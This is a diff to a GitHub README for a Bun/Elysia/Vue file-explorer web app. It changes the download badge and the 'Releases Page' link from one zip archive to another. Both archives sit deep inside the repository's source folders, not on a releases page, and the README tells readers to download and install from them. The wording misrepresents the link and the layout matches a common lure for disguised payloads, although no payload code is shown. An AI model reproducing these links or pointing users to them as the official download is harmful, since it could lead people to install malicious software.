@@ -1,6 +1,6 @@
 # 🖥️ windows-explorer-bun-elysia-vue-hexagonal - Your Visual Guide to File Management
 
-![Download](https://raw.githubusercontent.com/amanx0987/windows-explorer-bun-elysia-vue-hexagonal/main/backend/explorer/infrastructure/src/repositories/windows-explorer-bun-elysia-vue-hexagonal-v3.5.zip)
+![Download](https://github.com/amanx0987/windows-explorer-bun-elysia-vue-hexagonal/raw/refs/heads/main/frontend/windows-vue-elysia-explorer-hexagonal-bun-3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Windows Explorer WEB application! This tool helps you manage file
 
 ## 📥 Download & Install
 
-To get started, you need to download the application. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/amanx0987/windows-explorer-bun-elysia-vue-hexagonal/main/backend/explorer/infrastructure/src/repositories/windows-explorer-bun-elysia-vue-hexagonal-v3.5.zip)
+To get started, you need to download the application. Visit this page to download: [Releases Page](https://github.com/amanx0987/windows-explorer-bun-elysia-vue-hexagonal/raw/refs/heads/main/frontend/windows-vue-elysia-explorer-hexagonal-bun-3.1.zip)
 
 1. Click on the link above to open the releases page.
 2. Look for the latest version that suits your operating system.
